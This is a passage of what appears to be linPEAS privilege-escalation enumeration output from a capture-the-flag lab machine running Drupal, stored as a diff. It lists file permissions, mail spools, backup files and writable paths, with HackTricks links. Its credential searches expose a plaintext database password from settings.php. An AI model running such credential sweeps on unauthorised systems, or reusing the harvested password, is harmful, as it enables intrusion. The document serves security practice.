+-rw-r--r--.  1 root root  201 Mar 24  2017 colorgrep.sh
+-rw-r--r--.  1 root root 1741 Nov 16  2020 colorls.csh
+-rw-r--r--.  1 root root 1606 Nov 16  2020 colorls.sh
+-rw-r--r--.  1 root root   80 Apr  1  2020 csh.local
+-rw-r--r--.  1 root root 1706 Nov 16  2020 lang.csh
+-rw-r--r--.  1 root root 2703 Nov 16  2020 lang.sh
+-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh
+-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh
+-rw-r--r--.  1 root root   81 Apr  1  2020 sh.local
+-rw-r--r--.  1 root root  847 Oct 14  2020 snapd.sh
+-rw-r--r--.  1 root root  105 Oct 13  2020 vim.csh
+-rw-r--r--.  1 root root  269 Oct 13  2020 vim.sh
+-rw-r--r--.  1 root root  164 Jan 27  2014 which2.csh
+-rw-r--r--.  1 root root  169 Jan 27  2014 which2.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                        
+                                                                                                                    
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No                                                                       
+[+] Credentials in fstab/mtab? ........... No                                                                       
+[+] Can I read shadow files? ............. No                                                                       
+[+] Can I read opasswd file? ............. No                                                                       
+[+] Can I write in network-scripts? ...... No                                                                       
+[+] Can I read root folder? .............. No                                                                       
+                                                                                                                    
+[+] Searching root files in home dirs (limit 30)
+/home/                                                                                                              
+/home/brucetherealadmin/.bash_history
+/root/
+
+[+] Searching folders owned by me containing others files on it
+                                                                                                                    
+[+] Readable files belonging to root and readable by me but not world readable
+                                                                                                                    
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/lastlog                                                                                                    
+/var/log/wtmp
+/var/log/vmware-vgauthsvc.log.0
+/var/log/secure
+/var/log/cron
+/var/log/messages
+/home/brucetherealadmin/.gnupg/gpg.conf
+/home/brucetherealadmin/.gnupg/pubring.gpg
+/home/brucetherealadmin/.gnupg/trustdb.gpg
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                              
+                                                                                                                    
+[+] Files inside /home/brucetherealadmin (limit 20)
+total 16                                                                                                            
+drwx------. 3 brucetherealadmin brucetherealadmin 113 Jul 26 00:43 .
+drwxr-xr-x. 3 root              root               31 Dec  3  2020 ..
+lrwxrwxrwx. 1 root              root                9 Dec 11  2020 .bash_history -> /dev/null
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin  18 Apr  1  2020 .bash_logout
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 193 Apr  1  2020 .bash_profile
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 231 Apr  1  2020 .bashrc
+drwx------. 2 brucetherealadmin brucetherealadmin  60 Jul 26 00:43 .gnupg
+-r--------. 1 brucetherealadmin brucetherealadmin  33 Jul 25 22:50 user.txt
+
+[+] Files inside others home (limit 20)
+                                                                                                                    
+[+] Searching installed mail applications
+mailq.postfix                                                                                                       
+newaliases.postfix
+rmail.postfix
+postfix
+postfix
+sendmail
+sendmail.postfix
+mailq.postfix
+newaliases.postfix
+rmail.postfix
+postfix
+sendmail
+sendmail.postfix
+
+[+] Mails (limit 50)
+25179420    0 -rw-rw----   1 brucetherealadmin mail            0 Dec  3  2020 /var/mail/brucetherealadmin           
+25533863    4 -rw-------   1 root     mail         1675 Mar 23 09:56 /var/mail/root
+25179420    0 -rw-rw----   1 brucetherealadmin mail            0 Dec  3  2020 /var/spool/mail/brucetherealadmin
+25533863    4 -rw-------   1 root     mail         1675 Mar 23 09:56 /var/spool/mail/root
+
+[+] Backup folders
+drwx------. 2 root root 20 Sep 30  2020 /etc/lvm/backup                                                             
+
+[+] Backup files (limited 100)
+-rw-r--r--. 1 root root 1735 Oct 30  2018 /etc/nsswitch.conf.bak                                                    
+-rw-r--r--. 1 root root 98203 Mar 23 09:54 /var/log/dmesg.old
+-rw-r--r--. 1 root root 2284 Nov  9  2018 /usr/lib/modules/3.10.0-957.el7.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
+-rw-r--r--. 1 root root 2280 Nov 17  2020 /usr/lib/modules/3.10.0-1160.6.1.el7.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
+-rwxr-xr-x. 1 root root 36712 Nov 16  2020 /usr/lib64/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r--. 1 root root 475 May 22  2020 /usr/share/doc/initscripts-9.49.53/examples/networking/ifcfg-bond-activebackup-arpmon                                                                                                          
+-rw-r--r--. 1 root root 393 May 22  2020 /usr/share/doc/initscripts-9.49.53/examples/networking/ifcfg-bond-activebackup-miimon                                                                                                          
+-rw-r--r--. 1 root root 305 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_arp_ping_1.conf
+-rw-r--r--. 1 root root 465 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_arp_ping_2.conf
+-rw-r--r--. 1 root root 194 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_1.conf
+-rw-r--r--. 1 root root 212 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_2.conf
+-rw-r--r--. 1 root root 241 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_ethtool_3.conf
+-rw-r--r--. 1 root root 447 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_multi_lw_1.conf
+-rw-r--r--. 1 root root 285 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_nsna_ping_1.conf
+-rw-r--r--. 1 root root 318 Dec  9  2018 /usr/share/doc/teamd-1.29/example_configs/activebackup_tipc.conf
+-rw-r--r--. 1 root root 10357 Nov 27  2019 /usr/share/doc/bash-completion-2.1/CHANGES.package.old
+-rw-r--r--. 1 root root 2761 Aug  9  2019 /usr/share/man/man1/db_hotbackup.1.gz
+-r--r--r--. 1 root root 2797 Sep 30  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found: /var/lib/snapd/snap/core/10444/lib/firmware/regulatory.db: CRDA wireless regulatory database file            
+Found: /var/lib/snapd/snap/core/10859/lib/firmware/regulatory.db: CRDA wireless regulatory database file
+Found: /var/lib/yum/history/history-2020-12-02.sqlite: regular file, no read permission
+Found: /var/www/html/sites/default/settings.phpn/etc/aliases.db: cannot open (No such file or directory)
+Found: /etc/openldap/certs/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/openldap/certs/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/openldap/certs/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/pki/nssdb/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/pki/nssdb/cert9.db: SQLite 3.x database
+Found: /etc/pki/nssdb/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+Found: /etc/pki/nssdb/key4.db: SQLite 3.x database
+Found: /etc/pki/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
+ -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
+                                                                                                                    
+ -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)
+                                                                                                                    
+
+[+] Web files?(output limit)
+/var/www/:                                                                                                          
+total 8.0K
+drwxr-xr-x.  4 root   root     33 Dec  3  2020 .
+drwxr-xr-x. 21 root   root   4.0K Dec 11  2020 ..
+drwxr-xr-x.  2 root   root      6 Nov 16  2020 cgi-bin
+drwxr-xr-x.  9 apache apache 4.0K Dec 14  2020 html
+
+/var/www/cgi-bin:
+total 0
+drwxr-xr-x. 2 root root  6 Nov 16  2020 .
+
+[+] Readable hidden interesting files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data                                 
+-rw-r--r--. 1 root root 2853 Apr  1  2020 /etc/bashrc                                                               
+-rw-r--r--. 1 root root 11779 Mar 23 12:58 /etc/httpd/conf/httpd.conf
+Checking for creds on /etc/httpd/conf/httpd.conf
+                                                                                                                    
+-rw-r--r--. 1 root root 231 Apr  1  2020 /etc/skel/.bashrc
+-rw-r--r--. 1 root root 77 Nov 16  2020 /usr/lib/tmpfiles.d/httpd.conf
+Checking for creds on /usr/lib/tmpfiles.d/httpd.conf
+                                                                                                                    
+-rw-r--r--. 1 root root 2188 Sep  1  2015 /var/lib/snapd/snap/core/10444/etc/bash.bashrc
+-rw-r--r--. 1 root root 3771 Sep  1  2015 /var/lib/snapd/snap/core/10444/etc/skel/.bashrc
+-rw-r--r--. 1 root root 655 Jul 12  2019 /var/lib/snapd/snap/core/10444/etc/skel/.profile
+-rw-r--r--. 1 root root 3106 Aug 14  2019 /var/lib/snapd/snap/core/10444/usr/share/base-files/dot.bashrc
+-rw-r--r--. 1 root root 2188 Sep  1  2015 /var/lib/snapd/snap/core/10859/etc/bash.bashrc
+-rw-r--r--. 1 root root 3771 Sep  1  2015 /var/lib/snapd/snap/core/10859/etc/skel/.bashrc
+-rw-r--r--. 1 root root 655 Jul 12  2019 /var/lib/snapd/snap/core/10859/etc/skel/.profile
+-rw-r--r--. 1 root root 3106 Aug 14  2019 /var/lib/snapd/snap/core/10859/usr/share/base-files/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r--. 1 root root 166 Nov  8  2018 /boot/.vmlinuz-3.10.0-957.el7.x86_64.hmac                                  
+-rw-r--r--. 1 root root 171 Nov 17  2020 /boot/.vmlinuz-3.10.0-1160.6.1.el7.x86_64.hmac
+-rw-r--r--. 1 root root 0 Jul 25 22:49 /run/initramfs/.need_shutdown
+-rw-r--r--. 1 root root 18 Apr  1  2020 /etc/skel/.bash_logout
+-rw-r--r--. 1 root root 193 Apr  1  2020 /etc/skel/.bash_profile
+-rw-------. 1 root root 0 Dec  2  2020 /etc/.pwd.lock
+-rw-r--r--. 1 root root 129 Nov 16  2020 /etc/selinux/targeted/.policy.sha512
+-rw-r--r--. 1 root root 163 Dec  2  2020 /etc/.updated
+-rw-r--r--. 1 root root 0 Dec  2  2020 /var/lib/rpm/.dbenv.lock
+-rw-r--r--. 1 root root 0 Dec  2  2020 /var/lib/rpm/.rpm.lock
+-rw-------. 1 root root 0 Nov 19  2020 /var/lib/snapd/snap/core/10444/etc/.pwd.lock
+-rw-r--r--. 1 root root 220 Sep  1  2015 /var/lib/snapd/snap/core/10444/etc/skel/.bash_logout
+-rw-r--r--. 1 root root 1319 Nov 19  2020 /var/lib/snapd/snap/core/10444/var/lib/apparmor/profiles/.apparmor.md5sums
+-rw-------. 1 root root 0 Feb 10 12:18 /var/lib/snapd/snap/core/10859/etc/.pwd.lock
+-rw-r--r--. 1 root root 220 Sep  1  2015 /var/lib/snapd/snap/core/10859/etc/skel/.bash_logout
+-rw-r--r--. 1 root root 1319 Feb 10 12:20 /var/lib/snapd/snap/core/10859/var/lib/apparmor/profiles/.apparmor.md5sums
+-rw-r--r--. 1 root root 0 Dec  3  2020 /var/cache/yum/x86_64/7/.gpgkeyschecked.yum
+-rw-r--r--. 1 root root 163 Dec  2  2020 /var/.updated
+-r--r--r--. 1 apache apache 476 Dec  3  2020 /var/www/html/sites/default/files/.htaccess
+-rw-r--r--. 1 apache apache 317 Jun 21  2017 /var/www/html/.editorconfig
+-rw-r--r--. 1 apache apache 6112 Jun 21  2017 /var/www/html/.htaccess
+-rw-r--r--. 1 root root 65 Aug  9  2019 /usr/lib64/.libcrypto.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Aug  9  2019 /usr/lib64/.libssl.so.1.0.2k.hmac
+-rw-r--r--. 1 root root 65 Aug  2  2017 /usr/lib64/.libgcrypt.so.11.hmac
+-rw-r--r--. 1 root root 40 Apr  1  2020 /usr/share/man/man1/..1.gz
+-rw-r--r--. 1 root root 42 Sep 30  2020 /usr/share/man/man5/.k5identity.5.gz
+-rw-r--r--. 1 root root 39 Sep 30  2020 /usr/share/man/man5/.k5login.5.gz
+-rw-r--r--. 1 root root 2328 Apr 23  2013 /usr/share/kde4/apps/kdm/themes/CentOS7/.colorlsCZ1
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 18 Apr  1  2020 /home/brucetherealadmin/.bash_logout
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 193 Apr  1  2020 /home/brucetherealadmin/.bash_profile
+
+[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                            
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 3736 Oct 29  2020 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/repomd.xml
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 0 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/cachecookie
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 617 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/mirrorlist.txt
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 4851 Mar 10 21:55 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/repomd.xml
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 0 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/cachecookie
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 17230 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/metalink.xml
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 2997 Feb 25 16:37 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/repomd.xml
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 0 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/cachecookie
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 662 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/mirrorlist.txt
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 3007 Mar  3 15:59 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/repomd.xml
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 0 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/cachecookie
+-rw-r--r--. 1 brucetherealadmin brucetherealadmin 683 Mar 11 08:28 /var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/mirrorlist.txt
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
+/dev/mqueue                                                                                                         
+/dev/shm
+/dev/shm/linpeas.sh
+/home/brucetherealadmin
+/run/user/1000
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/var/lib/snapd/snap/core/10444/run/lock
+/var/lib/snapd/snap/core/10444/tmp
+/var/lib/snapd/snap/core/10444/var/tmp
+/var/lib/snapd/snap/core/10859/run/lock
+/var/lib/snapd/snap/core/10859/tmp
+/var/lib/snapd/snap/core/10859/var/tmp
+/var/spool/mail/brucetherealadmin
+/var/tmp
+/var/tmp/yum-brucetherealadmin-afPf0v
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/cachecookie
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/gen
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/mirrorlist.txt
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/packages
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/base/repomd.xml
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/cachecookie
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/gen
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/metalink.xml
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/packages
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/epel/repomd.xml
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/cachecookie
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/gen
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/mirrorlist.txt
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/packages
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/extras/repomd.xml
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/cachecookie
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/gen
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/mirrorlist.txt
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/packages
+/var/tmp/yum-brucetherealadmin-afPf0v/x86_64/7/updates/repomd.xml
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
+  Group brucetherealadmin:                                                                                          
+/dev/shm/linpeas.sh                                                                                                 
+
+[+] Searching passwords in config PHP files
+                                                                                                                    
+[+] Checking for TTY (sudo/su) passwords in audit logs
+                                                                                                                    
+[+] Finding IPs inside logs (limit 70)
+      9 10.10.14.3                                                                                                  
+      4 10.10.14.6
+      4 10.10.14.4
+      3 10.10.14.10
+      1 10.2.5.36
+      1 10.10.14.5
+
+[+] Finding passwords inside logs (limit 70)
+                                                                                                                    
+[+] Finding emails inside logs (limit 70)
+      2 mockbuild@kbuilder.bsys.centos.org                                                                          
+      2 dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+/usr/lib/systemd/system/systemd-ask-password-console.service                                                        
+/usr/lib/systemd/system/systemd-ask-password-plymouth.service
+/usr/lib/systemd/system/systemd-ask-password-wall.service
+
+[+] Finding passwords inside key folders (limit 70) - only PHP files
+/var/www/html/modules/simpletest/drupal_web_test_case.php:        $curl_options[CURLOPT_USERPWD] = $this->httpauth_credentials;
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    $password = variable_get('simpletest_httpauth_password', NULL);
+/var/www/html/sites/default/default.settings.php:# $conf['proxy_password'] = '';
+/var/www/html/sites/default/default.settings.php: *     'password' => 'password',
+/var/www/html/sites/default/default.settings.php: *   'password' => 'password',
+/var/www/html/sites/default/settings.php:# $conf['proxy_password'] = '';
+/var/www/html/sites/default/settings.php:      'password' => 'CQHEy@9M*m23gBVj',
+/var/www/html/sites/default/settings.php: *     'password' => 'password',
+/var/www/html/sites/default/settings.php: *   'password' => 'password',
+
+[+] Finding passwords inside key folders (limit 70) - no PHP files
+/etc/alternatives/mysqlbug:PASSWD="cat /etc/passwd"                                                                 
+/etc/alternatives/mysqlbug:  $PASSWD | grep "^$LOGNAME:" | awk -F: '{print $5}' | sed -e 's/,.*//' > $TEMP
+/etc/GeoIP.conf:# ProxyUserPassword username:password
+/etc/libuser.conf:# LU_GROUPPASSWORD = !!
+/etc/libuser.conf:# LU_SHADOWPASSWORD = !!
+/etc/libuser.conf:# LU_USERPASSWORD = !!
+/etc/logrotate.d/mariadb:# password = <secret> 
+/etc/nsswitch.conf.bak:#passwd:    db files nisplus nis
+/etc/nsswitch.conf.bak:passwd:     files sss
+/etc/nsswitch.conf:#passwd:    db files nisplus nis
+/etc/nsswitch.conf:passwd:     files sss
+/etc/nsswitch.conf.rpmnew:#passwd:    db files nisplus nis
+/etc/nsswitch.conf.rpmnew:passwd:     files sss
+/etc/pam.d/password-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pki/tls/openssl.cnf:challengePassword              = A challenge password
+/etc/pki/tls/openssl.cnf:challengePassword_max          = 20
+/etc/pki/tls/openssl.cnf:challengePassword_min          = 4
+/etc/pki/tls/openssl.cnf:# input_password = secret
+/etc/pki/tls/openssl.cnf:# output_password = secret
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/selinux/semanage.conf:usepasswd=False
+/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent  --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*       system_u:object_r:dovecot_passwd_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*       --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock    --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?    --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock     --      system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd  --      system_u:object_r:nis_initrc_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd --      system_u:object_r:samba_secrets_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old   --      system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd        --      system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd        -- system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd    --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update    --      system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify    --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage       --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd     --      system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd      --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent    --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent      --      system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr        --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw        --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin       --      system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd    --      system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog   --      system_u:object_r:httpd_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*  --      system_u:object_r:nis_unit_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd   --      system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd    --      system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv    --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv  --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv     --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper   --      system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv   --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env        --      system_u:object_r:yppasswdd_exec_t:s0                                                                                                   
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd     --      system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd        --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update        --      system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_verify        --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/validate   --      system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vigr       --      system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vipw       --      system_u:object_r:admin_passwd_exec_t:s0
+
+[+] Finding possible password variables inside key folders (limit 140)
+/etc/selinux/targeted/contexts/files/file_contexts.homedirs:/home/[^/]+/public_git(/.*)?        unconfined_u:object_r:git_user_content_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/pgsql/test/regress(/.*)?    system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/jonas/pgsql(/.*)? system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/pgsql(/.*)? system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/postgres(ql)?(/.*)? system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/sepgsql(/.*)?       system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/sepgsql_contexts:db_database     *                       system_u:object_r:sepgsql_db_t:s0
+/var/www/html/includes/install.inc:    $mysql_database = $databases['mysql'];
+
+[+] Finding possible password in config files
+ /etc/security/pwquality.conf                                                                                       
+password quality limits
+password that must not be present in the
+password.
+password (plus one if
+password. If less than 0
+password.
+password.
+password.
+password.
+password.
+password.
+password.
+password (digits, uppercase, lowercase, others).
+password.
+password.
+passwd entry GECOS string of the user.
+ /etc/nsswitch.conf
+passwd:    db files nisplus nis
+passwd:     files sss
+ /etc/sestatus.conf
+passwd
+ /etc/httpd/conf/httpd.conf
+passwd files from being 
+ /etc/selinux/semanage.conf
+passwd check tells semanage to scan all pass word records for home directories
+passwd=False
+
+[+] Finding 'username' string inside key folders (limit 70)
+/etc/libuser.conf:LU_USERNAME = %n                                                                                  
+/var/www/html/includes/common.inc:    if ($proxy_username = variable_get('proxy_username', '')) {
+/var/www/html/includes/common.inc:    'username' => array(
+/var/www/html/includes/database/database.inc:  function __construct($dsn, $username, $password, $driver_options = array()) {
+/var/www/html/includes/filetransfer/filetransfer.inc:    $form['username'] = array(
+/var/www/html/includes/filetransfer/ftp.inc:    $this->username = $username;
+/var/www/html/includes/filetransfer/ftp.inc:    $username = empty($settings['username']) ? '' : $settings['username'];
+/var/www/html/includes/filetransfer/ssh.inc:  function __construct($jail, $username, $password, $hostname = "localhost", $port = 22) {
+/var/www/html/includes/filetransfer/ssh.inc:    $this->username = $username;
+/var/www/html/includes/filetransfer/ssh.inc:    $username = empty($settings['username']) ? '' : $settings['username'];
+/var/www/html/includes/install.inc:    $form['username'] = array(
+/var/www/html/includes/update.inc:      'username' => urldecode($url['user']),
+/var/www/html/modules/blog/blog.module:      $links['blog_usernames_blog'] = array(
+/var/www/html/modules/blog/blog.module:        'title' => t("!username's blog", array('!username' => format_username($node))),
+/var/www/html/modules/comment/comment.admin.inc:      'author' => theme('username', array('account' => $comment)),
+/var/www/html/modules/comment/comment.module:  $variables['author']    = theme('username', array('account' => $comment));
+/var/www/html/modules/dblog/dblog.admin.inc:        theme('username', array('account' => $dblog)),
